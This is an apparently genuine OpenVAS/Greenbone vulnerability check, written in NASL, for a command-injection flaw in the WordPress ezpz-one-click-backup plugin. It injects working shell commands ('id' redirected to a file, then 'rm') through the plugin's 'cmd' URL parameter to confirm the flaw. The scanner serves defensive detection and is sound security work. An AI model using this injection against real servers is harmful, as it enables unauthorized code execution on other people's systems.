# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105029");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2023-07-26T05:05:09+0000");

  script_name("WordPress Plugin 'ezpz-one-click-backup' 'cmd' Parameter OS Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2014/05/01/11");

  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-05-21 11:38:56 +0200 (Wed, 21 May 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code
  within the context of the web server.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");

  script_tag(name:"insight", value:"Input passed via the 'cmd' parameter in ezpz-archive-cmd.php
  is not properly sanitized.");

  script_tag(name:"solution", value:"Remove this plugin from your WordPress installation.");

  script_tag(name:"solution_type", value:"Mitigation");

  script_tag(name:"summary", value:"The ezpz-one-click-backup plugin for WordPress is prone to a
  remote code execution (RCE) vulnerability because it fails to properly validate user supplied input.");

  script_tag(name:"affected", value:"12.03.10 and some earlier versions.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + '.txt';
vuln_url = dir + "/wp-content/plugins/ezpz-one-click-backup/functions/ezpz-archive-cmd.php?cmd=";
url = vuln_url + 'id>../backups/' + file;

req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req );
if( ! buf || buf !~ "^HTTP/1\.[01] 200" )
  exit( 99 );

url = dir + '/wp-content/plugins/ezpz-one-click-backup/backups/' + file;
req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req );

if( buf =~ "uid=[0-9]+.*gid=[0-9]+" ) {
  url = vuln_url + 'rm%20../backups/' + file;
  req = http_get( item:url, port:port );
  http_send_recv( port:port, data:req, bodyonly:FALSE );
  report = http_report_vuln_url( port:port, url:vuln_url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
